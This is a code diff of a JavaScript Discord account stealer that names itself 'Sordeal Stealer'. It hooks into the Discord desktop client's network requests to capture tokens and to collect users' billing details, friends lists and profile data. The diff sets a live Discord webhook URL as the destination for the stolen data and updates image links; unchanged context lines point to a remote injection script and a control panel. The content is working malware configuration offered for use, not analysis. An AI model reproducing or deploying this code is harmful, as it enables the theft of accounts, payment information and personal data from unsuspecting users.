@@ -16,7 +16,7 @@ var config = {
     "embed-color": 16711718,
 
     injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1086681712471322684/3pVI3lzYu7Rep46h7Zo8Txvs_dvgy7yYX3RKETqUYy3OT8abFv_BKeNKAz9kzg0cOrfh",
     uwu: "https://panel.sordeal.net:3000/",
     Filter: {
         "urls": [
@@ -59,7 +59,7 @@ const makeEmbed = async ({
 }) => {
     var params = {
         username: "Sordeal Stealer",
-        avatar_url: "https://github.com/ShamanOracle/Assets/blob/main/sordeal.png",
+        avatar_url: "https://raw.githubusercontent.com/ShamanOracle/Assets/main/sordeal.png",
         content: "",
         embeds: [{
             title: title,
@@ -280,7 +280,7 @@ const FirstTime = async () => {
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
         if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-        if (!user.banner) var userBanner = "https://github.com/ShamanOracle/Assets/blob/main/triquetra-wallpaper-2560x800_59.jpg"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -372,7 +372,7 @@ const FirstTime = async () => {
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
             if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-            if (!user.banner) var userBanner = "https://github.com/ShamanOracle/Assets/blob/main/triquetra-wallpaper-2560x800_59.jpg"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -539,7 +539,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
     if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
-    if (!user.banner) var userBanner = "https://github.com/ShamanOracle/Assets/blob/main/triquetra-wallpaper-2560x800_59.jpg"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
